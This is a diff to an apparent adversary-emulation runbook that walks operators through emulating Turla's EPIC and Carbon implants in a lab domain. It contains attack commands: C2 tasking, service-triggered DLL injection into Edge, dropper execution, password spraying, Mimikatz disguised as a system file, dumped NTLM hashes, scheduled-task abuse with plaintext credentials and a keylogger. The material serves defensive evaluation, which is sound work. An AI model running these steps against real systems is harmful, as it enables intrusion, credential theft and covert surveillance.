@@ -1,6 +1,7 @@
 # Carbon Protections Scenario
 
 Legend of symbols:
+
 * :bulb: - callout notes
 * :heavy_exclamation_mark: - extremely important note
 * :arrow_right: - Switching to another session
@@ -125,6 +126,7 @@ subsequently, EPIC's worker DLL into Microsoft Edge.
 * Within your Kali control server terminal window, right click and select "Split Terminal Horizontally". Be careful not to terminate the control server.
 
 * In your lower terminal tab, copy and paste the first set of discovery commands:
+
 ```bash
 cd /opt/day1/turla/Resources/control_server
 ./evalsC2client.py --set-task 218780a0-870e-480e-b2c5dc 'exe | net group "Domain Admins" /domain && net group "Domain Computers" /domain && net group "Domain Controllers" /domain && tasklist /svc'
@@ -137,11 +139,13 @@ grep 'ViperVPNSvc' logs.txt -i
 ```
 
 * This should return:
-    * >```
+>
+* ```text
       >viperVpn.exe                  <PID> ViperVPNSvc
       >```
 
 * Wait for the command to return before tasking the next command to query the service and who can access it:
+
 ```bash
 ./evalsC2client.py --set-task 218780a0-870e-480e-b2c5dc 'exe | reg query HKLM\SYSTEM\CurrentControlSet\Services\ViperVPNSvc && powershell "$(Get-Acl -Path HKLM:\SYSTEM\CurrentControlSet\Services\ViperVPNSvc).Access"'
 ```
@@ -170,6 +174,7 @@ grep 'ViperVPNSvc' logs.txt -i
 sc.exe \\hobgoblin stop ViperVPNSvc
 sc.exe \\hobgoblin start ViperVPNSvc
 ```
+
 ℹ️ Starting the ViperVPN service should take at least 30 seconds and eventually
 result in an error `[SC] StartService FAILED 1053`. The EPIC injector will wait
 an additional 2 minutes before performing injection. If the `[SC] StartService
@@ -181,11 +186,13 @@ new session, contact your Evals lead.
 :arrow_right: Switch to your Kali attack station and confirm that a new elevated implant has registered.
 
 :arrow_right: Switch back to your Kali terminal and task the SYSTEM level EPIC implant to download the CARBON-DLL installer:
+
 ```bash
 ./evalsC2client.py --set-task 51515228-8a7b-4226-e6e3f4 'name | C:\Windows\System32\WinResSvc.exe | dropper.exe'
 ```
 
 * Wait for the command to return and then task the EPIC implant to execute the CARBON-DLL installer:
+
 ```bash
 ./evalsC2client.py --set-task 51515228-8a7b-4226-e6e3f4 'exe | C:\Windows\System32\WinResSvc.exe'
 ```
@@ -193,6 +200,7 @@ new session, contact your Evals lead.
 * CARBON-DLL should inject into the Microsoft Edge process and beacon back to the C2 server. Check that there is a new Carbon implant session registered with the C2 server
 
 * Wait for the command to return and then task the Carbon implant to execute some discovery commands:
+
 ```bash
 ./evalsC2client.py --set-task 9b5ef515 '{"id": 0, "cmd": "whoami"}'
 ```
@@ -266,6 +274,7 @@ domain admin accounts with weak passwords, one of which successfully mounts the
 
 :arrow_right: From the "smbclient" tab on the Kali Linux machine, copy the
 password spray script to `hobgoblin`:
+
 ```bash
 cd /opt/day1/turla/Resources/payloads/carbon/
 smbclient -U 'skt.local\frieda'%'Password3!' //10.20.20.102/C$ -c 'put password_spray.bat Users\Public\winsas64.bat'
@@ -281,6 +290,7 @@ smbclient -U 'skt.local\frieda'%'Password3!' //10.20.20.102/C$ -c 'put password_
 
 :heavy_exclamation_mark: Verify that the script successfully sprays `Frieda`'s
 password by checking that output matches the following:
+
 ```text
 The command completed successfully.
 
@@ -310,6 +320,7 @@ task.
 
 :arrow_right: From the "smbclient" tab on the Kali Linux machine, copy the
 Carbon installer executable to Windows host, `hobgoblin`.
+
 ```bash
 cd /opt/day1/turla/Resources/payloads/carbon/
 smbclient -U 'skt.local\frieda'%'Password3!' //10.20.20.102/C$ -c 'put carbon_installer_2.exe Windows\System32\wmimetricsq.exe'
@@ -359,12 +370,13 @@ Improvement Program\Consolidator` task appears in the output.
   * In the Command Prompt, press CTRL+F and in the "Find what:" field, enter
   `Customer Experience Improvement Program`
   * The output should contain:
-  * >    ```
-    >    Folder: \Microsoft\Windows\Customer Experience Improvement Program
-    >    TaskName                                 Next Run Time          Status         
-    >    ======================================== ====================== ===============
-    >    Consolidator                             2/24/2023 12:00:00 AM  Ready          
-    >    UsbCeip                                  N/A                    Ready      
+>
+* > ```text
+    > Folder: \Microsoft\Windows\Customer Experience Improvement Program
+    > TaskName                                 Next Run Time          Status         
+    > ======================================== ====================== ===============
+    > Consolidator                             2/24/2023 12:00:00 AM  Ready          
+    > UsbCeip                                  N/A                    Ready      
     >    ```
 
 * Wait for the command to return and then modify a scheduled task using the
@@ -382,7 +394,7 @@ schtasks /Run /S bannik /U skt\Frieda /P Password3! /TN "\Microsoft\Windows\Cust
 ```
 
 :arrow_right: Return to your RDP session to bannik.
- 
+
 * Open File Explorer and browse to `C:\Program Files\Windows NT\2028`. Validate
 the existence of a `dsntport.dat` file. The log file should be growing every
 ~20 seconds.
@@ -426,6 +438,7 @@ order to perform lateral movement to a second workstation in the domain.
 
 :arrow_right: From the "smbclient" tab on the Kali Linux machine, copy over
 Mimikatz to `bannik (10.20.10.9)`:
+
 ```bash
 cd /opt/day1/turla/Resources/payloads/carbon
 smbclient -U 'skt.local\frieda'%'Password3!' //10.20.10.9/C$ -c 'put mimikatz.exe Windows\System32\terabox.exe'
@@ -452,16 +465,17 @@ in the output.
   * In the Command Prompt, press CTRL+F and in the "Find what:" field, enter
   `NTLM : 07d128430a6338f8d537f6b3ae1dc136`
   * The output should contain:
-  * >    ```
-    >    RID  : 00000456 (1110)
-    >    User : Adalwolfa
+>
+* > ```text
+    > RID  : 00000456 (1110)
+    > User : Adalwolfa
     >
-    >    * Primary
-    >        NTLM : 07d128430a6338f8d537f6b3ae1dc136
-    >        LM   : 
-    >    Hash NTLM: 07d128430a6338f8d537f6b3ae1dc136
-    >        ntlm- 0: 07d128430a6338f8d537f6b3ae1dc136
-    >        lm  - 0: 95b8536c32208871930216e62d5e12d4
+    > * Primary
+    >     NTLM : 07d128430a6338f8d537f6b3ae1dc136
+    >     LM   : 
+    > Hash NTLM: 07d128430a6338f8d537f6b3ae1dc136
+    >     ntlm- 0: 07d128430a6338f8d537f6b3ae1dc136
+    >     lm  - 0: 95b8536c32208871930216e62d5e12d4
     >    ```
 
 :arrow_right: From the "smbclient" tab on the Kali Linux machine, copy over
@@ -565,7 +579,8 @@ C:\Windows\Temp\wingtsvcupdt.exe
 ```
 
 * NOTE: This should hang the terminal with the following output:
-    * >```
+>
+* ```text
       >Monitoring window information...
       >Set hooks
       >```
@@ -573,7 +588,7 @@ C:\Windows\Temp\wingtsvcupdt.exe
 * Simulate activity as Adalwolfa:
   * Minimize the elevated Windows Command Prompt
   * Open Edge.
-    * :heavy_exclamation_mark: **Type in full, do not copy or autocomplete,** 
+    * :heavy_exclamation_mark: **Type in full, do not copy or autocomplete,**
     <http://kagarov/index.html> into the address bar and press enter.
   * Open a new non-admin PowerShell terminal
     * **Type do not copy** the SSH command: `ssh adalwolfa@10.20.10.23`
@@ -589,6 +604,7 @@ C:\Windows\Temp\wingtsvcupdt.exe
 * From the elevated Windows Command Prompt, CTRL + C to kill the keylogger
 
 * Execute the following command to output the data written to the keylogger file:
+
 ```bat
 type %temp%\\~DFA512.tmp
 ```
